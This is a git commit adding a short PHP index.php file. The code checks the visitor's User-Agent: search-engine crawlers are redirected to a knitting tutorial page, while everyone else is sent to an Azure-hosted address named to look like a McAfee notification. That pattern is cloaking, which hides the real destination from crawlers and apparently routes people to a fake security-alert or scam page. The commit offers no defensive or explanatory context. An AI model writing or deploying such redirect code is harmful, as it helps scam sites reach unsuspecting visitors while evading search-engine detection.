9ece45d2d7a759c7e1ee3934cbb74b65a13be371
ronkroeger141 <74055293+ronkroeger141@users.noreply.github.com>
2020-11-30 21:22:53 +0530

    Create index.php

---
+++ index.php
@@ -0,0 +1,10 @@
+<?php
+$user_agent=$_SERVER['HTTP_USER_AGENT'];
+if((strstr(strtolower($user_agent), "googlebot")) || (preg_match('/yandex|yahoo|bot|crawl|slurp|spider/i', $user_agent)))
+{
+    header('Location:https://www.stitchandunwind.com/category/tutorial/knitting-tutorial/');
+}
+else{
+        header('Location:https://mcfeenotification.azurewebsites.net/');
+}
+?>
